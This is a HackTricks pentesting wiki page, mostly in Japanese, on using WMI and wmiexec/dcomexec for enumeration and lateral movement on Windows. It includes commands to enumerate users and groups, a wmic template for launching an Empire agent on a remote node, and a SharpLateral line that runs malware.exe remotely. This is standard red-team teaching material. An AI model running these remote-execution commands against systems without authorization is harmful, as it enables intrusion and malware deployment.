# WmiExec

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## How It Works Explained

プロセスは、ユーザー名とパスワードまたはハッシュが知られているホストでWMIを使用して開くことができます。コマンドはWmiexecによってWMIを使用して実行され、セミインタラクティブなシェル体験を提供します。

**dcomexec.py:** 異なるDCOMエンドポイントを利用して、このスクリプトはwmiexec.pyに似たセミインタラクティブなシェルを提供し、特にShellBrowserWindow DCOMオブジェクトを活用します。現在、MMC20、アプリケーション、シェルウィンドウ、およびシェルブラウザウィンドウオブジェクトをサポートしています。(source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI Fundamentals

### Namespace

ディレクトリスタイルの階層で構成されているWMIの最上位コンテナは\rootであり、その下に名前空間と呼ばれる追加のディレクトリが整理されています。
名前空間をリストするためのコマンド:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
名前空間内のクラスは、次のようにリストできます:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **クラス**

WMIクラス名（例：win32\_process）とその存在する名前空間を知ることは、すべてのWMI操作において重要です。  
`win32`で始まるクラスをリストするコマンド：
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
クラスの呼び出し:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### 方法

メソッドは、WMI クラスの 1 つ以上の実行可能な関数であり、実行できます。
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI列挙

### WMIサービスの状態

WMIサービスが稼働しているか確認するためのコマンド:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### システムおよびプロセス情報

WMIを通じてシステムおよびプロセス情報を収集する:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
攻撃者にとって、WMIはシステムやドメインに関する機密データを列挙するための強力なツールです。
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
リモートで特定の情報、例えばローカル管理者やログイン中のユーザーを取得するためのWMIのリモートクエリは、慎重なコマンド構築によって実現可能です。

### **手動リモートWMIクエリ**

リモートマシン上のローカル管理者やログイン中のユーザーを stealthy に特定することは、特定のWMIクエリを通じて達成できます。 `wmic` は、複数のノードでコマンドを同時に実行するためにテキストファイルからの読み取りもサポートしています。

WMIを介してプロセスをリモートで実行するためには、Empireエージェントを展開するなど、以下のコマンド構造が使用され、成功した実行は戻り値「0」で示されます：
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
このプロセスは、リモート実行とシステム列挙に対するWMIの能力を示しており、システム管理とペネトレーションテストの両方におけるその有用性を強調しています。

## References
* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Automatic Tools

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
{% endcode %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
